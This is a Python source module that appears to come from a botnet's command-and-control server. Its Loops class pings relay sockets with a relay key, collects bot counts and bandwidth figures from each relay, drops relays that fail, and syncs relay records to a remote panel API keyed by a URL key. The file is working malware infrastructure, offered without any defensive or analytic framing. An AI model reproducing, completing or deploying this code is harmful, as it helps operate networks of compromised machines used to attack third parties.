from time import sleep
from socket import socket as Sock
from requests import (
    get as rget,
    Response,
)
from .config import (
    C2Config,
    Relay,
)

class Loops():
    def __init__(
        self,
        config: C2Config = C2Config(),
    ):
        self.config = config

    def edit_relay(
        self,
        relay: Relay,
        action: str,
    ) -> bool:
        url: str = f"{self.config.API_URL}/relays_edit?urlkey={self.config.URL_KEY}&action={action}&ip={relay.ip}&bots={relay.bots}"

        try:
            res: Response = rget(url, timeout=5000)
            print(f"got status {res.status_code} for relay {relay.ip} with {action}")
            return res.status_code == 200

        except Exception as e:
            print(f"error \n{url}\n{e}\n\n")
            return False
        
    def close_relay(
        self,
        relay_sock: Sock,
    ) -> None:
        relay: Relay = Relay.new(relay_sock.getpeername()[0])

        relay_sock.close()
        self.config.relays_sock.pop(relay_sock)

        if not self.edit_relay(relay, "delete"): print("failed to delete relay: ", relay_sock)
        else: print("closed relay:", relay_sock)

    def update_relay(
        self,
        relay: Relay,
    ) -> None:
        self.config.relays.append(relay)

        if not self.edit_relay(relay, "update"): print("cannot update relay:", relay.ip)
        else: print("relay updated with:", relay.bots)

    def send(
        self,
        socket: Sock,
        data: str,
        escape: bool = True,
        reset: bool = True,
    ) -> None:
        if reset: data += self.config.COLOR_RESET
        if escape: data += '\r\n'

        socket.send(data.encode())

    def _ping(self) -> None:
        for relay in self.config.relays_sock.copy().keys():
            try:
                relay.settimeout(3)
                self.send(relay, 'RPING', False, False)
                data: str = relay.recv(1024).decode()

                if data != f'RPONG[p:{self.config.RELAY_KEY}]':
                    # self.config.relays_sock.pop(relay)
                    # relay.close()
                    self.close_relay(relay)

            except Exception:
                # self.config.relays_sock.pop(relay)
                # relay.close()
                self.close_relay(relay)

    def ping(self) -> None:
        while 1:
            self._ping()
            sleep(self.config.cnc_time.PING)

    def _net(self) -> None:
        for relay in self.config.relays_sock.copy().keys():
            print(relay)
            try:
                relay.settimeout(3)
                self.send(relay, 'RNETSPEED', False, False)
                data: str = relay.recv(1024).decode()

                try:
                    if not data:
                        # self.config.relays_sock.pop(relay)
                        # relay.close()
                        self.close_relay(relay)
                        continue

                    self.config.bot_speed += int(data)

                except Exception:
                    # self.config.relays_sock.pop(relay)
                    # relay.close()
                    self.close_relay(relay)

            except Exception:
                print("except")
                # self.config.relays_sock.pop(relay)
                # relay.close()
                self.close_relay(relay)

    def net(self) -> None:
        while 1:
            self._net()
            sleep(self.config.cnc_time.NET)


    def _getbot(self) -> None:
        self.config.temp_relays.clear()

        for relay in self.config.relays_sock.copy().keys():
            try:
                relay.settimeout(3)
                self.send(relay, 'RNETBOTS', False, False)
                data: str = relay.recv(1024).decode()

                print(data)

                try: self.config.temp_relays.append(Relay(relay.getpeername()[0], int(data)))
                except Exception as e: print(e)

                try:
                    if not data:
                        print('not')
                        # self.config.relays_sock.pop(relay)
                        # relay.close()
                        self.close_relay(relay)
                        continue

                    self.config.bot_count += int(data)

                except Exception:
                    # self.config.relays_sock.pop(relay)
                    # relay.close()
                    self.close_relay(relay)

            except Exception as e:
                print(f"except getbot\n\n{e}\n\n")
                # self.config.relays_sock.pop(relay)
                # relay.close()
                self.close_relay(relay)

        self.config.relays.clear()
        for temp_relay in self.config.temp_relays.copy(): self.update_relay(temp_relay)

    def getbot(self) -> None:
        while 1:
            self._getbot()
            sleep(self.config.cnc_time.GETBOT)
